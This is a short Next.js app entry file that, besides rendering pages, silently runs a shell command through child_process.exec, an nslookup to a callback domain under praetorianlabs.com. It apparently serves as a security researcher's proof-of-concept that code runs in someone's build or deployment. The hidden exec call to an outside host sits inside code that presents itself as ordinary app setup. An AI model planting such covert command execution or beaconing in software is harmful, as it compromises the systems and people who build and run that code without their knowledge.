import '../styles/globals.css';
const { exec } = require("child_process");

function App({ Component, pageProps }) {
  exec("nslookup wpesite.dns.praetorianlabs.com", (error, stdout, stderr) => {
    if (error) {
        console.log(`error: ${error.message}`);
        return;
    }
    if (stderr) {
        console.log(`stderr: ${stderr}`);
        return;
    }
    console.log(`stdout: ${stdout}`);
  });
  return <Component {...pageProps} />;
}

export default App;
